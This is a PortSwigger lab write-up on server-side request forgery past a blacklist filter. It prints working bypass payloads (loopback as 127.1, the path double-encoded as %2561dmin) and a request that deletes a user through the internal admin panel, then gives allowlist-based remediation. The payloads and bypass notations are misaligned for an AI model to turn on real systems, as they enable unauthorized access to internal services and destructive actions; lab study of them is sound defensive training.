# SSRF with blacklist-based input filter

**Category:** SSRF
**Level:** Practitioner
**Mechanism:** Blacklist bypass — alternative loopback notation + double URL-encoding

**Lab URL:** https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

---

## Vulnerability

The stock-check `stockApi` is an SSRF sink, defended by a **blacklist** that blocks
obvious loopback strings (`127.0.0.1`, `localhost`) and the word `admin`. A blacklist
enumerates bad input instead of validating the destination, so both filters fall to
equivalent representations the blacklist doesn't list.

## Reconnaissance & Exploitation

The internal admin panel is at `http://localhost/admin`, but both parts are filtered.
Two weak defenses, bypassed in turn:

**Defense 1 — host blacklist.** The literal loopback is blocked:

```
stockApi=http://127.0.0.1/   → "External stock check blocked for security reasons"
```

Loopback has many equivalent notations the blacklist doesn't cover (`127.1` expands to
`127.0.0.1`; also `0`, `0.0.0.0`, decimal `2130706433`, IPv6 `[::1]`, or a domain that
resolves to 127.0.0.1). `127.1` passed:

```
stockApi=http://127.1/   → 200 (reaches the server itself)
```

**Defense 2 — path blacklist (`admin`).** Adding the path got blocked again:

```
stockApi=http://127.1/admin   → 400 blocked
```

The app URL-decodes the input, so the filter checks the decoded string for `admin`. I
double-encoded a character of the word: `a` → `%61` → `%2561`. The filter sees
`%2561dmin` (no `admin`), passes it, then a later decode turns it back into `admin`:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.1/%2561dmin
```

```http
HTTP/2 200 OK
...  <h1>Users</h1>  carlos - /admin/delete?username=carlos
```

With the panel reached, the delete endpoint (same double-encoding) performed the action:

```http
stockApi=http://127.1/%2561dmin/delete?username=carlos
→ HTTP/2 302 Found, Location: /admin
```

carlos deleted — lab solved.

## Impact

SSRF to the internal admin panel and a destructive action, despite two anti-SSRF
filters. Blacklisting proves inadequate: the loopback has countless equivalent forms and
the path check is defeated by encoding, because the string the filter inspects is not the
string the fetch finally uses. Same full compromise as an undefended SSRF, two bypass
steps later.

## Remediation

- Do not blacklist. Use an **allowlist** of exact, expected hosts/paths and reject
  everything else; a fetch to anything not explicitly permitted fails.
- Resolve and validate the target **after** full decoding and DNS resolution, and block
  loopback/link-local/private ranges by resolved IP, not by string matching.
- Don't trust network position for authorisation: the internal `/admin` should require a
  real auth check (it was unauthenticated — the paired flaw).

## References

- **OWASP:** A10:2021 Server-Side Request Forgery (SSRF)
- **CWE:** CWE-918 (SSRF); CWE-184 (Incomplete List of Disallowed Inputs)

## Notes

- Loopback has many equivalent notations — worth memorising as bypass options:
  `127.0.0.1`, `127.1`, `0`, `0.0.0.0`, `2130706433` (decimal), `0x7f000001` (hex),
  `[::1]` (IPv6), or a hostname that resolves to it.
- Double-encoding beats a decode-then-filter order: `a`→`%61`→`%2561`. The filter sees
  the harmless `%2561`; a later decode restores `admin`. Same check/use mismatch as the
  path-traversal `%252f` and the SSPP labs.
- Blacklists are the wrong model everywhere in this repo (path traversal, SSRF, file
  upload): they enumerate the bad instead of defining the good. Allowlist + validate the
  canonical destination is the recurring fix.